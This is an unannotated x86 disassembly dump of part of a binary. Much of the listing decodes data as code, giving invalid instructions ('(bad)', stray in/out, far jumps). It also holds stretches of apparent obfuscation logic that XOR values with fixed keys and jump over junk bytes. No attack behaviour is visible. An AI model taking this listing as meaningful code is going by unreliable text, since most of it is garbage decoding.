  41dc4d:	cmp    eax,0x1e19a723
  41dc52:	clc    
  41dc53:	push   edx
  41dc54:	pop    eax
  41dc55:	mov    al,ds:0x4191e3f5
  41dc5a:	inc    ebx
  41dc5b:	lods   al,BYTE PTR ds:[esi]
  41dc5c:	iret   
  41dc5d:	adc    eax,0x267414ec
  41dc62:	sahf   
  41dc63:	jg     0x41dbea
  41dc65:	sbb    eax,0xd4d4ce7e
  41dc6a:	inc    edi
  41dc6b:	push   ds
  41dc6c:	sbb    al,0xb9
  41dc6e:	pop    ebx
  41dc6f:	mov    ebx,0x1218a80b
  41dc74:	fistp  WORD PTR [eax-0x44]
  41dc77:	lock outs dx,BYTE PTR ds:[esi]
  41dc79:	jns    0x41dc5b
  41dc7b:	sbb    ebx,ecx
  41dc7d:	add    al,0xaa
  41dc80:	fdivrp st(1),st
  41dc82:	xor    cl,BYTE PTR [ebx]
  41dc84:	push   cs
  41dc85:	das    
  41dc86:	ret    
  41dc87:	(bad)  
  41dc88:	aaa    
  41dc89:	pop    esi
  41dc8a:	fs xchg edi,eax
  41dc8c:	aas    
  41dc8d:	in     eax,dx
  41dc8e:	js     0x41dc89
  41dc90:	jmp    0x92e6:0x517e5f7c
  41dc97:	add    eax,0x898878dc
  41dc9c:	fisubr WORD PTR [eax+0x4497ce5]
  41dca2:	cmp    eax,0x52f27e6e
  41dca7:	add    bl,bh
  41dca9:	add    dh,BYTE PTR [edx]
  41dcab:	sbb    edx,edx
  41dcad:	in     eax,dx
  41dcae:	sub    eax,ebp
  41dcb0:	and    esp,DWORD PTR [esi]
  41dcb2:	test   DWORD PTR [ebp+0x3a],edi
  41dcb5:	arpl   bp,di
  41dcb7:	(bad)  
  41dcb8:	sub    DWORD PTR [edx+ebp*2],ebp
  41dcbb:	pop    es
  41dcbc:	cmc    
  41dcbd:	in     eax,0x52
  41dcbf:	push   ds
  41dcc0:	sub    edx,DWORD PTR [edx]
  41dcc2:	sub    eax,0xa82731f2
  41dcc7:	pop    ds
  41dcc8:	loopne 0x41dd3e
  41dcca:	cmp    DWORD PTR [eax+0x4258df2c],ebx
  41dcd0:	cli    
  41dcd1:	xor    BYTE PTR [ecx],dl
  41dcd3:	mov    al,0x1
  41dcd5:	inc    edi
  41dcd6:	mov    al,ds:0xb0d5611f
  41dcdb:	fsub   QWORD PTR [eax+edx*1-0x1f8fa897]
  41dce2:	sbb    eax,0x418a024b
  41dce7:	xchg   ecx,eax
  41dce8:	popa   
  41dce9:	mov    ch,0x1
  41dceb:	adc    al,0x45
  41dced:	in     eax,0x78
  41dcef:	ss test eax,0x8cbc9b35
  41dcf5:	aam    0x25
  41dcf7:	sysret 
  41dcf9:	punpckldq mm4,DWORD PTR [edx]
  41dcfc:	or     di,si
  41dcff:	pop    eax
  41dd00:	clc    
  41dd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd02:	jbe    0x41dd45
  41dd04:	mov    esp,0x24fad5b3
  41dd09:	inc    ebx
  41dd0a:	sbb    BYTE PTR [eax],dh
  41dd0c:	into   
  41dd0d:	cli    
  41dd0e:	push   esp
  41dd10:	add    al,0x5
  41dd12:	cmc    
  41dd13:	dec    ecx
  41dd14:	es lock mov cl,0xbe
  41dd18:	mov    ebx,0xedde7f8a
  41dd1d:	sub    dh,bl
  41dd1f:	mov    esi,0xf60ad020
  41dd24:	jmp    0x41dd96
  41dd26:	arpl   si,bp
  41dd28:	cmp    DWORD PTR [edx+0x19e3bc5a],edi
  41dd2e:	scas   eax,DWORD PTR es:[edi]
  41dd2f:	ret    
  41dd30:	push   0xffffffe2
  41dd32:	sbb    esp,DWORD PTR [ecx-0x37c0a891]
  41dd38:	test   al,0xa3
  41dd3a:	mov    cl,0x97
  41dd3c:	and    DWORD PTR [ebx+0x27],edx
  41dd3f:	adc    al,0x92
  41dd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd42:	dec    ebp
  41dd43:	lds    ebp,FWORD PTR [eax+0x45f38cd4]
  41dd49:	aaa    
  41dd4a:	push   esp
  41dd4b:	test   BYTE PTR [ebx+0x41],ch
  41dd4e:	sub    BYTE PTR [ebx+ebp*1+0x1f6a3292],ch
  41dd55:	push   cs
  41dd56:	mov    dh,0xa5
  41dd58:	sbb    BYTE PTR [edi-0x45],dh
  41dd5b:	in     al,dx
  41dd5c:	mov    BYTE PTR [ebx-0x43b7d9a4],bl
  41dd62:	hlt    
  41dd63:	lahf   
  41dd64:	scas   al,BYTE PTR es:[edi]
  41dd65:	or     al,0xe2
  41dd67:	shl    BYTE PTR [edx-0x58],cl
  41dd6a:	(bad)  
  41dd6b:	(bad)  
  41dd6c:	jno    0x41ddb6
  41dd6e:	push   0x35
  41dd70:	and    eax,0x93dafe09
  41dd75:	sbb    DWORD PTR [esi-0x7f],edi
  41dd78:	mov    dl,ah
  41dd7a:	imul   BYTE PTR [edi-0x3d]
  41dd7d:	mov    WORD PTR [edi],es
  41dd7f:	test   DWORD PTR [eax],esp
  41dd81:	das    
  41dd82:	mov    dl,0x3c
  41dd84:	mov    eax,0xf084ebbc
  41dd89:	ins    DWORD PTR es:[edi],dx
  41dd8a:	or     eax,0xf060fa13
  41dd8f:	lock pop esp
  41dd91:	loop   0x41ddcc
  41dd93:	pop    DWORD PTR [esi]
  41dd95:	mov    DWORD PTR ds:0xeb8a1a0c,ebx
  41dd9b:	mov    WORD PTR [ecx+0x4ceae381],?
  41dda1:	test   al,0x9
  41dda3:	and    BYTE PTR [edx+0x1f9d14ba],al
  41dda9:	pop    ebx
  41ddaa:	cmp    bl,BYTE PTR [ecx]
  41ddac:	dec    di
  41ddae:	add    BYTE PTR [ebp-0x1f92bb59],al
  41ddb4:	sbb    DWORD PTR [edx],edi
  41ddb6:	cmp    esi,DWORD PTR [eax+0x3806fa61]
  41ddbc:	pop    esp
  41ddbd:	add    eax,DWORD PTR [esi+0x4]
  41ddc0:	cs aad 0x7c
  41ddc3:	or     al,0x67
  41ddc5:	(bad)  
  41ddc7:	mov    eax,0xab697175
  41ddcc:	xchg   esp,eax
  41ddcd:	lds    ebp,FWORD PTR [ecx+0x22135bf4]
  41ddd3:	sbb    ebp,DWORD PTR [ebx+0xf]
  41ddd6:	inc    ebp
  41ddd7:	mov    dh,0x9
  41ddd9:	add    cl,BYTE PTR ds:0xdbb2caae
  41dddf:	jge    0x41dde4
  41dde1:	xchg   ebx,eax
  41dde2:	and    al,0x82
  41dde4:	push   eax
  41dde5:	cmp    ecx,DWORD PTR [esi-0x26]
  41dde8:	sar    esp,cl
  41ddea:	pop    es
  41ddeb:	into   
  41ddec:	cmovs  ebx,DWORD PTR [ebx-0x27]
  41ddf0:	adc    bl,bh
  41ddf2:	push   cs
  41ddf3:	das    
  41ddf4:	adc    edi,DWORD PTR [ebp+0xc]
  41ddf7:	lods   al,BYTE PTR ds:[esi]
  41ddf8:	out    dx,eax
  41ddf9:	adc    edi,DWORD PTR [eax+eiz*4-0x71407a48]
  41de00:	cmp    bl,dh
  41de02:	pmaxsw mm4,QWORD PTR [ebx+eax*2+0x612d9c60]
  41de0a:	jmp    0xc8fe:0x1b226fde
  41de11:	jp     0x41de30
  41de13:	dec    esp
  41de14:	in     al,0x5c
  41de16:	push   es
  41de17:	adc    cl,bh
  41de19:	and    BYTE PTR [esi+0x12],dh
  41de1c:	jno    0x41ddd1
  41de1e:	fbstp  TBYTE PTR [eax+0x7635fe9a]
  41de24:	mov    ch,0x79
  41de26:	retf   
  41de27:	xor    edx,0x9c2b8ae8
  41de2d:	mov    cl,0x2
  41de2f:	call   0x408bb8
  41de34:	mov    ecx,edx
  41de36:	mov    edx,DWORD PTR [ebp-0x15c]
  41de3c:	mov    DWORD PTR [ebp-0x218],esi
  41de42:	mov    esi,DWORD PTR [ebp-0x158]
  41de48:	xor    edx,0xcb79b576
  41de4e:	xor    esi,0x9c2b8ae8
  41de54:	mov    DWORD PTR [ebp-0x21c],eax
  41de5a:	mov    eax,edx
  41de5c:	mov    edx,esi
  41de5e:	mov    DWORD PTR [ebp-0x220],ecx
  41de64:	mov    cl,0x3e
  41de66:	call   0x4223f5
  41de6b:	mov    esi,DWORD PTR [ebp-0x21c]
  41de71:	or     esi,eax
  41de73:	mov    eax,DWORD PTR [ebp-0x220]
  41de79:	or     eax,edx
  41de7b:	push   eax
  41de7c:	push   esi
  41de7d:	push   ebx
  41de7e:	push   edi
  41de7f:	call   0x41594e
  41de84:	mov    esi,DWORD PTR [ebp-0x218]
  41de8a:	cmp    esi,eax
  41de8c:	jne    0x41df42
  41de92:	mov    eax,DWORD PTR [ebp-0x154]
  41de98:	mov    edx,DWORD PTR [ebp-0x150]
  41de9e:	xor    eax,0xcb79b576
  41dea3:	xor    edx,0x9c2b8ae8
  41dea9:	mov    cl,0x2
  41deab:	call   0x408bb8
  41deb0:	mov    esi,eax
  41deb2:	mov    edi,edx
  41deb4:	mov    eax,DWORD PTR [ebp-0x154]
  41deba:	mov    edx,DWORD PTR [ebp-0x150]
  41dec0:	xor    eax,0xcb79b576
  41dec5:	xor    edx,0x9c2b8ae8
  41decb:	mov    cl,0x3e
  41decd:	call   0x4223f5
  41ded2:	or     esi,eax
  41ded4:	or     edi,edx
  41ded6:	mov    eax,DWORD PTR [ebp-0x15c]
  41dedc:	mov    edx,DWORD PTR [ebp-0x158]
  41dee2:	xor    eax,0xcb79b576
  41dee7:	xor    edx,0x9c2b8ae8
  41deed:	mov    cl,0x2
  41deef:	call   0x408bb8
  41def4:	mov    ebx,eax
  41def6:	mov    eax,edx
  41def8:	mov    ecx,DWORD PTR [ebp-0x15c]
  41defe:	mov    edx,DWORD PTR [ebp-0x158]
  41df04:	xor    ecx,0xcb79b576
  41df0a:	xor    edx,0x9c2b8ae8
  41df10:	mov    DWORD PTR [ebp-0x224],eax
  41df16:	mov    eax,ecx
  41df18:	mov    cl,0x3e
  41df1a:	call   0x4223f5
  41df1f:	or     ebx,eax
  41df21:	mov    eax,DWORD PTR [ebp-0x224]
  41df27:	or     eax,edx
  41df29:	push   eax
  41df2a:	push   ebx
  41df2b:	push   edi
  41df2c:	push   esi
  41df2d:	call   0x41594e
  41df32:	mov    DWORD PTR [ebp-0x178],eax
  41df38:	jmp    0x41f19e
  41df3d:	jmp    0x41f154
  41df42:	lea    eax,[ebp-0x168]
  41df48:	mov    DWORD PTR [ebp-0x164],eax
  41df4e:	mov    eax,DWORD PTR [ebp-0x164]
  41df54:	mov    DWORD PTR [eax],0xa5069bae
  41df5a:	mov    eax,DWORD PTR [ebp-0x168]
  41df60:	xor    eax,0xa5069bae
  41df65:	shr    eax,0x2
  41df68:	mov    ecx,DWORD PTR [ebp-0x168]
  41df6e:	xor    ecx,0xa5069bae
  41df74:	shl    ecx,0x1e
  41df77:	or     eax,ecx
  41df79:	mov    ecx,DWORD PTR [ebp-0x174]
  41df7f:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  41df83:	mov    DWORD PTR [ebp-0x160],eax
  41df89:	mov    esi,DWORD PTR [ebp-0x160]
  41df8f:	mov    eax,DWORD PTR [ebp-0x154]
  41df95:	mov    edx,DWORD PTR [ebp-0x150]
  41df9b:	xor    eax,0xcb79b576
  41dfa0:	xor    edx,0x9c2b8ae8
  41dfa6:	mov    cl,0x2
  41dfa8:	call   0x408bb8
  41dfad:	mov    edi,eax
  41dfaf:	mov    ebx,edx
  41dfb1:	mov    eax,DWORD PTR [ebp-0x154]
  41dfb7:	jmp    0x41e39e
  41dfbc:	mov    bl,0xa1
  41dfbe:	mov    eax,ds:0xbba5b3a5
  41dfc3:	mov    ebx,0xd1567b79
  41dfc8:	in     al,dx
  41dfc9:	fldenv [edx]
  41dfcb:	sahf   
  41dfcc:	nop
  41dfcd:	pop    edi
  41dfce:	sar    BYTE PTR [esi-0x41413bb6],0xa0
  41dfd5:	or     al,0x56
  41dfd7:	mov    esp,DWORD PTR [eax-0x26071df4]
  41dfdd:	push   eax
  41dfde:	or     dh,BYTE PTR [edi+0x3f]
  41dfe1:	adc    dh,al
  41dfe3:	mov    BYTE PTR [ecx-0x2e],ah
  41dfe6:	and    DWORD PTR [edx],ebp
  41dfe8:	(bad)  
  41dfe9:	sar    DWORD PTR [edi+eax*2],1
  41dfec:	mov    esi,0x22c10fde
  41dff1:	out    dx,al
  41dff2:	lahf   
  41dff3:	push   edx
  41dff4:	in     eax,dx
  41dff5:	clc    
  41dff6:	out    dx,al
  41dff7:	stc    
  41dff8:	mov    BYTE PTR [ecx+0x6e158277],ch
  41dffe:	pusha  
  41dfff:	inc    esp
  41e000:	cmp    eax,0xdd45e983
  41e005:	sbb    edi,DWORD PTR [ebp+0x27376d6f]
  41e00b:	xchg   ebx,eax
  41e00c:	or     cl,BYTE PTR [ebx-0x68d4ce8a]
  41e012:	sbb    al,0xa9
  41e014:	into   
  41e015:	or     eax,DWORD PTR [ebx+edx*2+0x2c]
  41e019:	cli    
  41e01a:	add    eax,0xdaa8e6
  41e01f:	out    0xf6,eax
  41e021:	iret   
  41e022:	mov    ebp,0x79a98eb
  41e027:	nop
  41e028:	mov    eax,0xe74e1566
  41e02d:	mov    cl,0xfe
  41e02f:	test   BYTE PTR [edx],cl
  41e031:	sbb    DWORD PTR [eax-0x5b2db2cd],eax
  41e037:	leave  
  41e038:	ja     0x41e03b
  41e03a:	inc    esi
  41e03b:	add    edi,DWORD PTR [edi-0x61]
  41e03e:	mov    eax,0x750e8ba9
  41e043:	jbe    0x41dff4
  41e045:	cmp    esi,eax
  41e047:	xor    DWORD PTR [ecx],ecx
  41e049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e04a:	fcom   st(4)
  41e04c:	lods   al,BYTE PTR ds:[esi]
  41e04d:	and    eax,0x7ef56383
  41e052:	cwde   
  41e053:	push   eax
  41e054:	push   eax
  41e055:	shl    BYTE PTR [ecx+0x53],cl
  41e058:	xor    eax,0x3c54e6a4
  41e05d:	dec    esp
  41e05e:	xor    DWORD PTR [esi],eax
  41e060:	dec    eax
  41e061:	arpl   WORD PTR [eax-0x47],di
  41e064:	ror    edi,cl
  41e066:	stc    
  41e067:	adc    eax,0xcea5d941
  41e06c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41e06e:	cmc    
  41e06f:	aam    0xe3
  41e071:	jg     0x41e033
  41e073:	lock sbb eax,0xcc83b060
  41e079:	sbb    bh,BYTE PTR [ebx-0x58]
  41e07c:	dec    ecx
  41e07d:	mov    ds:0xe3eb1d35,al
  41e082:	or     ebx,ecx
  41e084:	mov    esp,0xb1c4e124
  41e089:	iret   
  41e08a:	scas   al,BYTE PTR es:[edi]
  41e08b:	mov    ebp,0x33e461d1
  41e090:	fidiv  DWORD PTR [edi]
  41e092:	adc    DWORD PTR [esi-0xa],edi
  41e095:	lds    ecx,FWORD PTR [esi+0x37]
  41e098:	jnp    0x41e0af
  41e09a:	js     0x41e0a5
  41e09c:	mov    al,0x55
  41e09e:	lahf   
  41e09f:	cmp    BYTE PTR [ecx],cl
  41e0a1:	sar    DWORD PTR [esi+0x36],cl
  41e0a4:	xchg   ebx,eax
  41e0a5:	sbb    DWORD PTR [esi-0x54],ecx
  41e0a8:	sub    DWORD PTR [eax+esi*2-0x22],esp
  41e0ac:	ss pop edx
  41e0ae:	in     al,0xab
  41e0b0:	and    edi,DWORD PTR [esi+0x89bd347]
  41e0b6:	fisttp QWORD PTR [ebp+eiz*4+0x78]
  41e0ba:	cli    
  41e0bb:	jo     0x41e0dc
  41e0bd:	xchg   edi,eax
  41e0be:	into   
  41e0bf:	inc    eax
  41e0c0:	jne    0x41e0bf
  41e0c2:	fsub   st,st(1)
  41e0c4:	add    dl,BYTE PTR [ecx+0x3557ce19]
  41e0ca:	and    bh,BYTE PTR [eax+0x61542d7c]
  41e0d0:	ficom  DWORD PTR [ecx-0x1e]
  41e0d3:	sbb    al,0x7
  41e0d5:	mov    ah,0xa5
  41e0d7:	rcr    DWORD PTR [ebx],0xf
  41e0da:	mov    al,ds:0x51fafcfd
  41e0df:	push   esi
  41e0e0:	fdivr  QWORD PTR [edx-0x1fc135af]
  41e0e6:	dec    edi
  41e0e7:	mov    WORD PTR [ebx],es
  41e0e9:	stos   BYTE PTR es:[edi],al
  41e0ea:	rol    ecx,0x5c
  41e0ed:	sbb    BYTE PTR [edx-0x68],0xe4
  41e0f1:	cmp    BYTE PTR [ebx+ebp*2+0x5a5debb0],dh
  41e0f8:	xchg   edi,eax
  41e0f9:	js     0x41e086
  41e0fb:	or     esp,DWORD PTR [ecx+ecx*2]
  41e0fe:	mov    ah,0xce
  41e100:	mov    ds:0xf8b2cfa7,eax
  41e105:	and    BYTE PTR [eax],dh
  41e107:	push   edx
  41e108:	xor    DWORD PTR [ecx+0x603072f6],esi
  41e10e:	shl    dh,1
  41e110:	cmp    esi,DWORD PTR [esi-0x38abd809]
  41e116:	push   ebx
  41e117:	xor    al,0x5b
  41e119:	dec    edx
  41e11a:	jmp    0x96636a92
  41e11f:	and    esp,DWORD PTR [ebx+0x2d]
  41e122:	pop    ecx
  41e123:	stos   DWORD PTR es:[edi],eax
  41e124:	or     al,0x4b
  41e126:	jbe    0x41e12c
  41e128:	dec    esi
  41e129:	fistp  DWORD PTR [eax+0x52]
  41e12c:	shr    BYTE PTR [esi],0xc1
  41e12f:	push   ebp
  41e130:	jno    0x41e10a
  41e132:	jge    0x41e0e0
  41e134:	jne    0x41e0f7
  41e136:	push   ds
  41e137:	(bad)  
  41e139:	sub    esp,DWORD PTR [ebx-0x38]
  41e13c:	lods   al,BYTE PTR ds:[esi]
  41e13d:	jne    0x41e11e
  41e13f:	sbb    eax,0x1c5c3da1
  41e144:	(bad)  
  41e145:	xor    BYTE PTR [edx],dh
  41e147:	ret    0x9f81
  41e14a:	out    0x26,eax
  41e14c:	mov    ah,0x5c
  41e14e:	rcr    BYTE PTR [eax-0x446c7af],cl
  41e154:	mov    gs,WORD PTR [edi+0x193eb42b]
  41e15a:	loope  0x41e1c0
  41e15c:	xlat   BYTE PTR ds:[ebx]
  41e15d:	(bad)  
  41e15e:	mov    ebx,0x3e719d92
  41e163:	mov    dl,0xed
  41e165:	or     eax,0x7d8b14aa
  41e16a:	scas   eax,DWORD PTR es:[edi]
  41e16b:	adc    al,ah
  41e16d:	or     DWORD PTR [esp+ebp*1+0x116571c6],esp
  41e174:	es in  eax,0xda
  41e177:	push   edi
  41e178:	sahf   
  41e179:	add    al,0xdf
  41e17b:	leave  
  41e17c:	and    BYTE PTR [edx+0xb],dh
  41e17f:	xchg   ecx,eax
  41e180:	pop    ebx
  41e181:	popf   
  41e182:	add    eax,0xd942d8ec
  41e187:	repnz lods al,BYTE PTR ds:[esi]
  41e189:	call   0x27a36bc0
  41e18e:	lds    edx,FWORD PTR [eax-0x64]
  41e191:	jmp    0x90c960f0
  41e196:	mov    cl,0x0
  41e198:	ins    DWORD PTR es:[edi],dx
  41e199:	popf   
  41e19a:	jl     0x41e1a9
  41e19c:	or     dh,ch
  41e19e:	sub    BYTE PTR [eax],bh
  41e1a0:	adc    DWORD PTR [ecx],0xdeb7517c
  41e1a6:	popa   
  41e1a7:	adc    edx,eax
  41e1a9:	and    al,0xc
  41e1ab:	pop    es
  41e1ac:	aaa    
  41e1ad:	mov    BYTE PTR [ecx-0x2d9a9ae9],dh
  41e1b3:	xor    BYTE PTR [ecx],0xef
  41e1b6:	fild   DWORD PTR [esi]
  41e1b8:	inc    eax
  41e1b9:	arpl   WORD PTR [ecx-0x23],bp
  41e1bc:	inc    edi
  41e1bd:	mov    dh,0x35
  41e1bf:	adc    BYTE PTR [esi],bl
  41e1c1:	pop    ebx
  41e1c2:	imul   ecx,esp,0xffffff8c
  41e1c5:	xor    ebx,edi
  41e1c7:	jae    0x41e21b
  41e1c9:	cmp    al,0x98
  41e1cb:	pop    edx
  41e1cc:	stc    
  41e1cd:	mov    WORD PTR [ebx],ax
  41e1d0:	test   DWORD PTR [esi-0x65],ebx
  41e1d3:	cmc    
  41e1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1d5:	pushf  
  41e1d6:	and    ecx,DWORD PTR [ebx+0x48]
  41e1d9:	xor    ecx,DWORD PTR [edx+0x585f4942]
  41e1df:	add    dh,BYTE PTR [edx-0x6c]
  41e1e2:	add    DWORD PTR ds:0xb9f75cde,eax
  41e1e8:	mov    WORD PTR [edi+0x6068ad6a],cs
  41e1ee:	pop    es
  41e1ef:	dec    esi
  41e1f0:	mov    ah,0x91
  41e1f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1f3:	outs   dx,DWORD PTR ds:[esi]
  41e1f4:	xor    ebp,DWORD PTR [edi+ecx*8]
  41e1f7:	jo     0x41e195
  41e1f9:	scas   eax,DWORD PTR es:[edi]
  41e1fa:	in     eax,dx
  41e1fb:	pop    esp
  41e1fc:	xor    BYTE PTR [eax+ebx*4-0x8d2a35],0xda
  41e204:	dec    ebp
  41e205:	sbb    ebp,edi
  41e207:	jne    0x41e27f
  41e209:	jns    0x41e1da
  41e20b:	inc    edx
  41e20c:	inc    esi
  41e20d:	push   ds
  41e20e:	adc    ebx,DWORD PTR [eax]
  41e210:	fstp   DWORD PTR [ebp+0x57460975]
  41e216:	mov    bh,0xcc
  41e218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e219:	xor    BYTE PTR [edx+0x1f686e26],bl
  41e21f:	inc    eax
  41e220:	clc    
  41e221:	add    DWORD PTR [ecx-0x1f],eax
  41e224:	fbld   TBYTE PTR [ebx-0x5dd51a87]
  41e22a:	add    DWORD PTR [ebx+esi*8-0x700fbb4b],edi
  41e231:	outs   dx,BYTE PTR ds:[esi]
  41e232:	sahf   
  41e233:	fwait
  41e234:	jmp    0x41e28c
  41e236:	push   edx
  41e237:	dec    edi
  41e238:	(bad)  
  41e239:	xchg   ecx,eax
  41e23a:	cli    
  41e23b:	js     0x41e25f
  41e23d:	retf   0x56e6
  41e240:	pop    esi
  41e241:	push   ecx
  41e242:	mov    bl,0xc7
  41e244:	or     esp,DWORD PTR ds:0x6bf6e47
  41e24a:	mov    bh,0xe5
  41e24c:	fnstenv [ecx+0x7ffa7510]
  41e252:	rol    BYTE PTR [esi+0x402eb83b],cl
  41e258:	mov    bp,0x553d
  41e25c:	das    
  41e25d:	scas   al,BYTE PTR es:[edi]
  41e25e:	arpl   ax,bp
  41e260:	retf   0x4f85
  41e263:	xlat   BYTE PTR ds:[ebx]
  41e264:	call   0xada6402e
  41e269:	xchg   ebx,eax
  41e26a:	cmp    dl,0x25
  41e26d:	push   edi
  41e26e:	aaa    
  41e26f:	out    dx,al
  41e270:	pop    ss
  41e271:	push   esi
  41e272:	mov    al,ds:0xd50bf5b1
  41e277:	push   cs
  41e278:	add    DWORD PTR [eax+0xb974ab],0xcad92564
  41e282:	out    dx,eax
  41e283:	in     al,dx
  41e284:	xlat   BYTE PTR ds:[ebx]
  41e285:	stos   DWORD PTR es:[edi],eax
  41e286:	sbb    BYTE PTR [eax],0xe
  41e289:	push   0x6745ac5
  41e28e:	pusha  
  41e28f:	push   ds
  41e290:	cmp    cl,al
  41e292:	sbb    DWORD PTR [ecx-0x66],eax
  41e295:	outs   dx,BYTE PTR ds:[esi]
  41e296:	hlt    
  41e297:	ja     0x41e2ad
  41e299:	cmp    al,0x3d
  41e29b:	shl    ecx,cl
  41e29d:	cld    
  41e29e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e29f:	lods   eax,DWORD PTR ds:[esi]
  41e2a0:	out    dx,eax
  41e2a1:	add    di,WORD PTR [ebx-0x45]
  41e2a5:	aad    0x78
  41e2a7:	add    bl,dh
  41e2a9:	inc    eax
  41e2aa:	leave  
  41e2ab:	or     eax,0x74d339cd
  41e2b0:	mov    cl,0x92
  41e2b2:	cli    
  41e2b3:	pop    eax
  41e2b4:	sub    ebp,0xc7c01e2b
  41e2ba:	push   edx
  41e2bb:	pop    esp
  41e2bc:	dec    ecx
  41e2bd:	mov    al,0xb7
  41e2bf:	js     0x41e2d5
  41e2c1:	stc    
  41e2c2:	and    esp,esi
  41e2c4:	jp     0x41e24c
  41e2c6:	xor    dh,BYTE PTR [ebx+eiz*1]
  41e2c9:	inc    ebp
  41e2ca:	cdq    
  41e2cb:	loope  0x41e31c
  41e2cd:	mov    ebp,0xf05fe8d4
  41e2d2:	lods   eax,DWORD PTR ds:[esi]
  41e2d3:	mov    bl,0x20
  41e2d5:	mov    ds:0x306607de,al
  41e2da:	out    0x41,al
  41e2dc:	js     0x41e31b
  41e2de:	jnp    0x41e283
  41e2e0:	mov    eax,0xf1dff627
  41e2e5:	jg     0x41e35f
  41e2e7:	stos   DWORD PTR es:[edi],eax
  41e2e8:	fisttp DWORD PTR [esi]
  41e2ea:	push   0x4c
  41e2ec:	inc    edi
  41e2ed:	push   eax
  41e2ee:	repnz fistp QWORD PTR [ebx-0x52eec40e]
  41e2f5:	jecxz  0x41e35a
  41e2f7:	je     0x41e34d
  41e2f9:	inc    eax
  41e2fa:	push   ebx
  41e2fb:	pop    esp
  41e2fc:	scas   eax,DWORD PTR es:[edi]
  41e2fd:	aas    
  41e2fe:	shl    ax,0x6b
  41e302:	sbb    eax,0x11f64cac
  41e307:	add    DWORD PTR [ebx+0x31],esp
  41e30a:	mov    al,ds:0x6aa23746
  41e30f:	fidiv  DWORD PTR [ecx-0x50]
  41e312:	std    
  41e313:	jne    0x41e30e
  41e315:	mov    ah,0xb
  41e317:	stc    
  41e318:	cmp    dl,BYTE PTR [edi+0x6a804b7b]
  41e31e:	jge    0x41e2cc
  41e320:	adc    al,0x4b
  41e322:	jo     0x41e2b3
  41e324:	mov    ds:0x497362ff,eax
  41e329:	xlat   BYTE PTR ds:[ebx]
  41e32a:	rcr    esi,1
  41e32c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e32d:	xchg   edx,eax
  41e32e:	mov    eax,ds:0x8ea238a4
  41e333:	jo     0x41e375
  41e335:	fistp  WORD PTR [ebp-0x347a9d35]
  41e33b:	and    ecx,ebp
  41e33d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e33e:	and    BYTE PTR [eax+0x70],al
  41e341:	dec    edi
  41e342:	xor    ah,ch
  41e344:	mov    WORD PTR [eax+0x1c],es
  41e347:	pop    esi
  41e348:	jmp    0x41e321
  41e34a:	(bad)  
  41e34b:	jl     0x41e3a5
  41e34d:	mov    eax,0xb4fdffdc
  41e352:	gs mov bh,0xf2
  41e355:	nop
  41e356:	xor    bl,BYTE PTR [ecx]
  41e358:	test   ebx,ecx
  41e35a:	xchg   esp,eax
  41e35b:	shl    BYTE PTR [edi],cl
  41e35d:	ja     0x41e3a5
  41e35f:	adc    ecx,DWORD PTR [eax+ebp*2+0x5b]
  41e363:	cmp    al,BYTE PTR [eax-0x2b]
  41e366:	pop    ebp
  41e367:	test   BYTE PTR [esi-0x460e012d],0x29
  41e36e:	fcom   QWORD PTR [edi-0x47]
  41e371:	xchg   ebp,eax
  41e372:	jnp    0x41e36b
  41e374:	lock mov ecx,0xd59fe4f1
  41e37a:	dec    ebp
  41e37b:	add    eax,0xa0291962
  41e380:	mov    bh,0xaa
  41e382:	outs   dx,DWORD PTR ds:[esi]
  41e383:	sar    ecx,0x5d
  41e386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e387:	sar    BYTE PTR [ecx-0x548a3b91],1
  41e38d:	cli    
  41e38e:	mov    ah,0xac
  41e390:	out    dx,eax
  41e391:	in     al,dx
  41e392:	retf   0x4ae1
  41e395:	arpl   WORD PTR [edi],sp
  41e397:	cmp    esi,DWORD PTR [edi-0x370af277]
  41e39d:	xchg   ebx,eax
  41e39e:	mov    edx,DWORD PTR [ebp-0x150]
  41e3a4:	xor    eax,0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x4223f5
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x4223f5
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	cli    
  41e433:	push   0x671ccfb2
  41e438:	sar    BYTE PTR [esi-0x41413bb6],0x66
  41e43f:	push   eax
  41e440:	cwde   
  41e441:	rol    esi,0xad
  41e444:	in     al,dx
  41e445:	and    BYTE PTR [eax],ah
  41e447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
